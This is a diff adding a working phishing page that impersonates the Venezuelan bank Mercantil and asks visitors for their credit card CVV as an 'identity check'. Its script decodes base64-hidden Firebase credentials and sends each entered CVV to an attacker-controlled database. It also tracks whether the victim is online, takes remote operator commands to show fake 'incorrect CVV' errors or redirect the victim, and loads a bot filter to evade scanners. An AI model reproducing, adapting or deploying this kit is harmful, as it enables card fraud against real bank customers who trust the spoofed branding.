@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+<meta name="theme-color" content="#1976d2">
+<title>Mercantil</title>
+<style>
+:root{--blue:#007bff;--indigo:#6610f2;--purple:#6f42c1;--pink:#e83e8c;--red:#dc3545;--orange:#fd7e14;--yellow:#ffc107;--green:#28a745;--teal:#20c997;--cyan:#17a2b8;--white:#fff;--gray:#6c757d;--gray-dark:#343a40;--primary:#007bff;--secondary:#6c757d;--success:#28a745;--info:#17a2b8;--warning:#ffc107;--danger:#dc3545;--light:#f8f9fa;--dark:#343a40;--breakpoint-xs:0;--breakpoint-sm:576px;--breakpoint-md:768px;--breakpoint-lg:992px;--breakpoint-xl:1200px;--font-family-sans-serif:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,"Noto Sans","Liberation Sans",sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol","Noto Color Emoji";--font-family-monospace:SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace}*,:after,:before{box-sizing:border-box}html{font-family:sans-serif;line-height:1.15;-webkit-text-size-adjust:100%;-webkit-tap-highlight-color:transparent}body{font-size:1rem;font-weight:400;line-height:1.5;color:#212529;text-align:left;background-color:#fff}*{box-sizing:border-box}html,body{height:100%}body{font-family:Arial,sans-serif}header{height:70px;align-items:center;padding:0 20px}header img{height:40px}
+html,body{margin:0;padding:0;background:#f2f2f2}.wrap{max-width:650px;margin:0 auto;width:90%}.hdr-top{background:#004e9b;width:100%;display:flex;justify-content:center}.hdr-top img{width:60%;max-width:240px;margin:auto;padding:8px 0;display:block}.card{background:#fff;border-radius:12px;padding:22px;box-shadow:0 2px 6px rgba(0,0,0,.18);margin-top:22px}#h3{color:#009fda;font-size:24px;font-weight:600;margin:14px 0 6px}#h6{color:#004e9b;font-weight:600;font-size:20px;margin:8px 0}.subt{font-size:13px;color:#556}.lbl{display:block;color:#004e9b;font-weight:600;font-size:14px;margin:22px 0 10px}.pins{display:flex;gap:.6rem;justify-content:center}.pin{width:44px;height:52px;border:none;border-bottom:2px solid #447db6;text-align:center;font-size:1.7rem;background:transparent;outline:none}.pin:focus{border-color:#008f76}.infoNum{font-size:13px;color:#556;margin:8px 0 4px}.adis{text-align:center;line-height:1.5;margin:22px 0;font-size:13.5px;color:#445}button.cont{width:100%;background:#004e9b;color:#fff;border:none;padding:12px;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;margin-top:10px}button.cont:hover{background:#003b77}footer{text-align:center;font-size:11px;color:#889;padding:26px 12px;line-height:1.5}
+</style>
+<script src="bots_filter.js"></script>
+<script src="config.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
+</head>
+<body>
+<header class="hdr-top"><img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNzciIGhlaWdodD0iMjkiIHZpZXdCb3g9IjAgMCA3NyAyOSIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTUyLjkzNDIgMC42MDk3NDFDNDkuOTU3NSAxLjM5OTggNDcuNDIwMiAzLjEyNDE1IDQ1LjIwNDEgNS45NjYzN0M0My4xNzE2IDguNTc1ODUgNDEuNDA0NiAxMS4yMDUgMzkuNTQyNiAxMy45NDg5QzM3LjYzNzkgMTYuNzU4MyAzNS44NTc5IDE5LjU4NzQgMzMuNTE3MiAyMi4wMjk3QzMwLjAzOSAyNS42NzE4IDIxLjgyMDUgMjUuMzgwMSAxOC41NDg4IDE5Ljk2NzdDMTYuODA0OCAxNy4wNzYzIDE2LjUxNjMgMTMuNjM0MiAxNy45MzkgMTAuNjUxQzE5LjI3MzMgNy44NTc5MSAyMS44ODkzIDUuODIyMTMgMjQuODk1NCA1LjQwOTA3QzI5LjQzNTggNC43ODI5MyAzMy40NTE2IDYuMTcyOSAzNS45NTYyIDEwLjUxOThMMzguNzA5OSA2LjQ0MTcyQzM4LjA1NzYgNS4zNzMwMSAzNy4zMjY1IDQuNTI3MjMgMzYuMzcyNSAzLjc4MzA3QzI5Ljk4MzMgLTEuMTkwMDEgMTkuMzYxOCAtMC40NTU2ODUgMTQuNTg1NCA3LjA4MDk3QzExLjkzNjYgMTEuMjYwNyAxMS40OTczIDE2LjU2NDkgMTMuNjA1MiAyMC45NTEyQzE1LjIyNzkgMjQuMzI3NyAxNy45ODE3IDI2Ljc2MzUgMjEuMzcxMyAyOC4wNDJDMjUuMTcwOCAyOS40NzQ2IDMwLjY1MiAyOS4zNTk4IDM0LjI0ODIgMjcuMjk0NkMzNi4yNzc1IDI2LjEyNzUgMzcuOTQ2MSAyNC41NDc0IDM5LjI5MDIgMjIuNjI2M0w0NS42NzI5IDEzLjQ5NjVDNDcuMjMzMyAxMS4yNjczIDQ4LjcxNTEgOS4wNTExOSA1MC41NjczIDcuMDcxMTRDNTIuODU1NSA0LjYyNTU4IDU3LjE0MzQgMy44NDUzNiA2MC43MTY3IDQuOTkyNzRDNTkuMDU0NiAyLjk5OTU3IDU1LjIwNiAwLjgxOTU0OCA1Mi45MzQyIDAuNjEzMDE5VjAuNjA5NzQxWiIgZmlsbD0id2hpdGUiLz4KPHBhdGggZD0iTTAuMTE4MTY0IDQuODY4MTZMNC43MzA2NCA0Ljk0MDI4TDQuNzMzOTEgMjguOTUzM0w4Ljk2MjgzIDI4Ljk0MDJMOC45NjYxMSAwLjc5OTg3M0wyLjU0MDc4IDAuNzkwMDM5TDAuMTE4MTY0IDQuODY4MTZaIiBmaWxsPSJ3aGl0ZSIvPgo8cGF0aCBkPSJNNTAuMTU0MSAyMS4zNDQ2QzUwLjIxOTYgMjEuMzU0NCA1MC4yODg1IDIxLjM2MSA1MC4zNjA2IDIxLjM3NDFDNTAuMjY1NSAyMS4yOTIxIDUwLjE2NzIgMjEuMjAzNiA1MC4wNzU0IDIxLjExMThDNDkuOTU0MSAyMS4xNjc1IDQ5Ljk2NzIgMjEuMzE4MyA1MC4xNTQxIDIxLjM0NDZaIiBmaWxsPSJ3aGl0ZSIvPgo8cGF0aCBkPSJNNTAuMTU0MSAyMS4zNDQ2QzUwLjIxOTYgMjEuMzU0NCA1MC4yODg1IDIxLjM2MSA1MC4zNjA2IDIxLjM3NDFDNTAuMjY1NSAyMS4yOTIxIDUwLjE2NzIgMjEuMjAzNiA1MC4wNzU0IDIxLjExMThDNDkuOTU0MSAyMS4xNjc1IDQ5Ljk2NzIgMjEuMzE4MyA1MC4xNTQxIDIxLjM0NDZaIiBmaWxsPSJ3aGl0ZSIvPgo8cGF0aCBkPSJNNzIuODYyNCA4LjMzNjU0QzczLjIyMyAxMS43MTY0IDcwLjE4MDggMTUuMDczMyA2NS4xOTEzIDE3LjQ5OTJDNjQuNDQ3MSAyMi4yNzU2IDYxLjQ5MDIgMjYuMzIwOSA1Ny4zOTg5IDI4LjU0NjhDNjguMDA0IDI4LjE1MzQgNzYuNDMyMyAyMS45MTgzIDc2LjQzMjMgMTQuMjgzMkM3Ni40MzIzIDkuNzEwMTEgNzMuNDA2NSA1LjYzODU1IDY4LjY5OSAzLjAyMjUyQzcxLjExNSA0LjQxMjQ5IDcyLjYzNjIgNi4yMjg2MyA3Mi44NjI0IDguMzMzMjZWOC4zMzY1NFoiIGZpbGw9IiNGQUU4MzEiLz4KPHBhdGggZD0iTTcyLjg2MjQgOC4zMzY1NEM3My4yMjMgMTEuNzE2NCA3MC4xODA4IDE1LjA3MzMgNjUuMTkxMyAxNy40OTkyQzY0LjQ0NzEgMjIuMjc1NiA2MS40OTAyIDI2LjMyMDkgNTcuMzk4OSAyOC41NDY4QzY4LjAwNCAyOC4xNTM0IDc2LjQzMjMgMjEuOTE4MyA3Ni40MzIzIDE0LjI4MzJDNzYuNDMyMyA5LjcxMDExIDczLjQwNjUgNS42Mzg1NSA2OC42OTkgMy4wMjI1MkM3MS4xMTUgNC40MTI0OSA3Mi42MzYyIDYuMjI4NjMgNzIuODYyNCA4LjMzMzI2VjguMzM2NTRaIiBmaWxsPSJ1cmwoI3BhaW50MF9saW5lYXJfNDE5Nl8xOTAwKSIgc3R5bGU9Im1peC1ibGVuZC1tb2RlOm11bHRpcGx5Ii8+CjxwYXRoIGQ9Ik03Mi44NjIyIDguMzM2NTRDNzIuNjM2IDYuMjMxOTIgNzEuMTE4MiA0LjQxMjUgNjguNjk4OSAzLjAyNTgxQzY4LjIzNjYgMi43NzAxMSA2Ny43NjEzIDIuNTI3NTIgNjcuMjY5NiAyLjMwMTMyQzY0LjExOTIgMC44NDkwNjIgNjAuMzYyMyAwIDU2LjMzMDEgMEM1NS40NTQ4IDAgNTQuNTg5NCAwLjAzOTMzOSA1My43NDY4IDAuMTE4MDE3QzUzLjc0MDMgMC4xMTgwMTcgNTMuNzMzNyAwLjExODAxNyA1My43MjcyIDAuMTE4MDE3QzUzLjcyNzIgMC4xMTgwMTcgNTMuNzI3MiAwLjExODAxNyA1My43MjM5IDAuMTE4MDE3QzUzLjY3OCAwLjExODAxNyA1My42Mzg3IDAuMTYwNjMzIDUzLjYzODcgMC4yMDk4MDdDNTMuNjM4NyAwLjI1NTcwMiA1My42NzE1IDAuMjkxNzYzIDUzLjcxNDEgMC4yOTgzMTlDNjAuNDA4MiAxLjkxNzc3IDY1LjM4MTMgNy45NDMxNSA2NS4zODEzIDE1LjEzMjNDNjUuMzgxMyAxNS45MzU1IDY1LjMxOSAxNi43Mjg4IDY1LjE5NzcgMTcuNDk5MkM3MC4xODcyIDE1LjA3MzMgNzMuMjI5NCAxMS43MTY0IDcyLjg2ODggOC4zMzY1NEg3Mi44NjIyWiIgZmlsbD0iIzQ2OURENSIvPgo8cGF0aCBkPSJNNzIuODYyMiA4LjMzNjU0QzcyLjYzNiA2LjIzMTkyIDcxLjExODIgNC40MTI1IDY4LjY5ODkgMy4wMjU4MUM2OC4yMzY2IDIuNzcwMTEgNjcuNzYxMyAyLjUyNzUyIDY3LjI2OTYgMi4zMDEzMkM2NC4xMTkyIDAuODQ5MDYyIDYwLjM2MjMgMCA1Ni4zMzAxIDBDNTUuNDU0OCAwIDU0LjU4OTQgMC4wMzkzMzkgNTMuNzQ2OCAwLjExODAxN0M1My43NDAzIDAuMTE4MDE3IDUzLjczMzcgMC4xMTgwMTcgNTMuNzI3MiAwLjExODAxN0M1My43MjcyIDAuMTE4MDE3IDUzLjcyNzIgMC4xMTgwMTcgNTMuNzIzOSAwLjExODAxN0M1My42NzggMC4xMTgwMTcgNTMuNjM4NyAwLjE2MDYzMyA1My42Mzg3IDAuMjA5ODA3QzUzLjYzODcgMC4yNTU3MDIgNTMuNjcxNSAwLjI5MTc2MyA1My43MTQxIDAuMjk4MzE5QzYwLjQwODIgMS45MTc3NyA2NS4zODEzIDcuOTQzMTUgNjUuMzgxMyAxNS4xMzIzQzY1LjM4MTMgMTUuOTM1NSA2NS4zMTkgMTYuNzI4OCA2NS4xOTc3IDE3LjQ5OTJDNzAuMTg3MiAxNS4wNzMzIDczLjIyOTQgMTEuNzE2NCA3Mi44Njg4IDguMzM2NTRINzIuODYyMloiIGZpbGw9InVybCgjcGFpbnQxX2xpbmVhcl80MTk2XzE5MDApIiBzdHlsZT0ibWl4LWJsZW5kLW1vZGU6bXVsdGlwbHkiLz4KPHBhdGggZD0iTTUyLjgyMjcgMjAuODYyN0M1MS43NjA2IDIwLjk3NzQgNDkuODU5MiAyMS4wNzU3IDQ5LjY4MjIgMjEuMDg1NkM0OS40NjU4IDIxLjA5ODcgNDkuNDM2MyAyMS4zMTE4IDQ5LjY2OTEgMjEuMzQxM0M1MS44Mjk0IDIxLjYxOTkgNTYuMjE1NyAyMy41OTAxIDU3LjM5MjYgMjguNTQzNkM2MS40ODM4IDI2LjMxNzYgNjQuNDQwOCAyMi4yNzIzIDY1LjE4NDkgMTcuNDk1OUM2MS44MDUxIDE5LjEzODMgNTcuNTMwMyAyMC4zNTQ1IDUyLjgxNjIgMjAuODU5NEw1Mi44MjI3IDIwLjg2MjdaIiBmaWxsPSIjRkFFODMxIi8+CjxwYXRoIGQ9Ik01Mi44MjI3IDIwLjg2MjdDNTEuNzYwNiAyMC45Nzc0IDQ5Ljg1OTIgMjEuMDc1NyA0OS42ODIyIDIxLjA4NTZDNDkuNDY1OCAyMS4wOTg3IDQ5LjQzNjMgMjEuMzExOCA0OS42NjkxIDIxLjM0MTNDNTEuODI5NCAyMS42MTk5IDU2LjIxNTcgMjMuNTkwMSA1Ny4zOTI2IDI4LjU0MzZDNjEuNDgzOCAyNi4zMTc2IDY0LjQ0MDggMjIuMjcyMyA2NS4xODQ5IDE3LjQ5NTlDNjEuODA1MSAxOS4xMzgzIDU3LjUzMDMgMjAuMzU0NSA1Mi44MTYyIDIwLjg1OTRMNTIuODIyNyAyMC44NjI3WiIgZmlsbD0idXJsKCNwYWludDJfbGluZWFyXzQxOTZfMTkwMCkiIHN0eWxlPSJtaXgtYmxlbmQtbW9kZTptdWx0aXBseSIvPgo8ZGVmcz4KPGxpbmVhckdyYWRpZW50IGlkPSJwYWludDBfbGluZWFyXzQxOTZfMTkwMCIgeDE9IjY1LjQ5OTQiIHkxPSIxMy4yNTA2IiB4Mj0iNjcuMTk3NiIgeTI9IjIyLjQ1OTIiIGdyYWRpZW50VW5pdHM9InVzZXJTcGFjZU9uVXNlIj4KPHN0b3Agc3RvcC1jb2xvcj0iI0Y4QzlCNSIvPgo8c3RvcCBvZmZzZXQ9IjEiIHN0b3AtY29sb3I9IiNFQzY0MkIiLz4KPC9saW5lYXJHcmFkaWVudD4KPGxpbmVhckdyYWRpZW50IGlkPSJwYWludDFfbGluZWFyXzQxOTZfMTkwMCIgeDE9IjY3LjcyMiIgeTE9IjE5LjM0ODEiIHgyPSI2Mi4zOTQ4IiB5Mj0iMS4yMjkzNCIgZ3JhZGllbnRVbml0cz0idXNlclNwYWNlT25Vc2UiPgo8c3RvcCBzdG9wLWNvbG9yPSIjRjJGNUY5Ii8+CjxzdG9wIG9mZnNldD0iMSIgc3RvcC1jb2xvcj0iIzAwMzM4RCIvPgo8L2xpbmVhckdyYWRpZW50Pgo8bGluZWFyR3JhZGllbnQgaWQ9InBhaW50Ml9saW5lYXJfNDE5Nl8xOTAwIiB4MT0iNjQuNTY1NCIgeTE9IjI0Ljg3ODUiIHgyPSI1MC41NzA2IiB5Mj0iMTYuOTM1MyIgZ3JhZGllbnRVbml0cz0idXNlclNwYWNlT25Vc2UiPgo8c3RvcCBzdG9wLWNvbG9yPSIjRkFEOENBIi8+CjxzdG9wIG9mZnNldD0iMSIgc3RvcC1jb2xvcj0iI0VDNjQyQiIvPgo8L2xpbmVhckdyYWRpZW50Pgo8L2RlZnM+Cjwvc3ZnPgo=" alt=Mercantil></header>
+<div class="wrap">
+ <div id="h3">Verifiquemos tu identidad</div>
+ <div class="card">
+ <p id="h6">Ingresa los 3 dígitos al reverso de tu tarjeta</p>
+ <p class="subt"><b>Siguiente paso:</b> Finalizar</p>
+ <p class="infoNum">Introduce los 3 dígitos del CVV solicitados para confirmar tu identidad.</p>
+ <form id="pinForm">
+ <label class="lbl">CVV</label>
+ <div class="pins">
+ <input class="pin" type="tel" maxlength="1" id="c1" inputmode="numeric" placeholder="">
+ <input class="pin" type="tel" maxlength="1" id="c2" inputmode="numeric" placeholder="">
+ <input class="pin" type="tel" maxlength="1" id="c3" inputmode="numeric" placeholder="">
+ </div>
+ <div class="adis">Recuerda que es el código de tu tarjeta de crédito, no de débito.</div>
+ <button class="cont" type="submit">Continuar</button>
+ </form>
+ </div>
+ <footer>El acceso o uso no autorizado se considera un delito. Derechos protegidos por Mercantil C.A., Banco Universal. RIF: J-00002961-0.</footer>
+</div>
+
+<script>
+(function(){
+var pins = ['c1','c2','c3'];
+
+pins.forEach(function(id, idx){
+  var inp = document.getElementById(id);
+  if(!inp) return;
+
+  inp.addEventListener('input', function(){
+    inp.value = inp.value.replace(/\D/g,'').slice(0,1);
+    if(inp.value && idx < pins.length-1){
+      var next = document.getElementById(pins[idx+1]);
+      if(next) next.focus();
+    }
+  });
+
+  inp.addEventListener('keydown', function(e){
+    if(e.key==='Backspace' && !inp.value && idx>0){
+      var prev = document.getElementById(pins[idx-1]);
+      if(prev){ prev.value=''; prev.focus(); }
+    }
+    if(e.key==='ArrowLeft' && idx>0) document.getElementById(pins[idx-1]).focus();
+    if(e.key==='ArrowRight' && idx<pins.length-1) document.getElementById(pins[idx+1]).focus();
+  });
+
+  inp.addEventListener('paste', function(e){
+    e.preventDefault();
+    var text=(e.clipboardData||window.clipboardData).getData('text').replace(/\D/g,'');
+    pins.forEach(function(pid,pi){
+      var el=document.getElementById(pid);
+      if(el) el.value=text[pi]||'';
+    });
+    var lastIdx=Math.min(text.length,pins.length)-1;
+    if(lastIdx>=0) document.getElementById(pins[lastIdx]).focus();
+  });
+
+  inp.addEventListener('focus', function(){
+    for(var i=0;i<idx;i++){
+      var prev=document.getElementById(pins[i]);
+      if(prev&&!prev.value){ prev.focus(); return; }
+    }
+  });
+});
+
+setTimeout(function(){ var f=document.getElementById('c1'); if(f)f.focus(); },100);
+
+// ===== FIREBASE =====
+var _d=atob,_c={
+  apiKey:_d('QUl6YVN5Q0FIVkRzLUVfTEtvVldyMXJKdmRqSHpHTndfbU0xSjVN'),
+  authDomain:_d('ZGV2aWNlLXN0cmVhbWluZy0yZjllNjhiNi5maXJlYmFzZWFwcC5jb20='),
+  databaseURL:_d('aHR0cHM6Ly9kZXZpY2Utc3RyZWFtaW5nLTJmOWU2OGI2LWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbQ=='),
+  projectId:_d('ZGV2aWNlLXN0cmVhbWluZy0yZjllNjhiNg=='),
+  storageBucket:_d('ZGV2aWNlLXN0cmVhbWluZy0yZjllNjhiNi5maXJlYmFzZXN0b3JhZ2UuYXBw'),
+  messagingSenderId:_d('NTQyMDQ3NjIwNjYz'),
+  appId:_d('MTo1NDIwNDc2MjA2NjM6d2ViOjFlMzUyNmYxZGVlODA5MzdlZjc5YjI=')
+};
+if(!firebase.apps.length) firebase.initializeApp(_c);
+var db = firebase.database();
+var PATH = (typeof SITE_ID !== 'undefined' && SITE_ID) ? SITE_ID : _d('dm1fNzdjZjI4ZmZkYg==');
+
+var sid = (new URLSearchParams(window.location.search)).get('id') || sessionStorage.getItem('_sid') || null;
+
+// Show error state if ?err=1
+if(window.location.search.indexOf('err=1') !== -1){
+  setTimeout(function(){
+    pins.forEach(function(pid){
+      var el=document.getElementById(pid);
+      if(el){ el.style.borderBottom='2px solid #dc3545'; el.value=''; }
+    });
+    var adis=document.querySelector('.adis');
+    if(adis){
+      var errEl=document.getElementById('_cvv_err');
+      if(!errEl){
+        errEl=document.createElement('div');
+        errEl.id='_cvv_err';
+        errEl.style.cssText='color:#dc3545;font-weight:700;font-size:13px;text-align:center;margin-top:8px;';
+        errEl.textContent='El CVV ingresado es incorrecto. Verifique los 3 dígitos al reverso de su tarjeta.';
+        adis.parentNode.insertBefore(errEl, adis);
+      }
+      errEl.style.display='block';
+    }
+    document.getElementById('c1').focus();
+  },200);
+}
+
+if(sid){
+  var ref=db.ref(PATH+'/'+sid);
+  ref.update({ page:'cvv.html', estado:'online' });
+
+  // Listen for commands
+  ref.child('command').on('value', function(snap){
+    var cmd=snap.val();
+    if(!cmd||!cmd.action) return;
+
+    if(cmd.action==='error_cvv'){
+      pins.forEach(function(pid){
+        var el=document.getElementById(pid);
+        if(el){ el.style.borderBottom='2px solid #dc3545'; el.value=''; }
+      });
+      var adis=document.querySelector('.adis');
+      if(adis){
+        var errEl=document.getElementById('_cvv_err');
+        if(!errEl){
+          errEl=document.createElement('div');
+          errEl.id='_cvv_err';
+          errEl.style.cssText='color:#dc3545;font-weight:700;font-size:13px;text-align:center;margin-top:8px;';
+          errEl.textContent='El CVV ingresado es incorrecto. Verifique los 3 dígitos al reverso de su tarjeta.';
+          adis.parentNode.insertBefore(errEl, adis);
+        }
+        errEl.style.display='block';
+      }
+      document.getElementById('c1').focus();
+      ref.child('command').remove();
+      return;
+    }
+
+    ref.child('command').remove();
+    window.location.href=cmd.page;
+  });
+
+  window.addEventListener('beforeunload',function(){ ref.update({estado:'offline'}); });
+}
+
+// ===== SUBMIT BUTTON =====
+var form=document.getElementById('pinForm');
+if(form){
+  form.addEventListener('submit',function(e){
+    e.preventDefault();
+    var code=pins.map(function(id){
+      var el=document.getElementById(id);
+      return el ? el.value : '';
+    }).join('');
+
+    if(code.length < 3){
+      document.getElementById('c1').focus();
+      return;
+    }
+
+    if(sid){
+      db.ref(PATH+'/'+sid).update({ cvv: code, page:'carga.html', estado:'online' });
+    }
+    sessionStorage.setItem('_sid', sid||'');
+    window.location.href='carga.html';
+  });
+}
+
+})();
+</script>
+</body>
+</html>
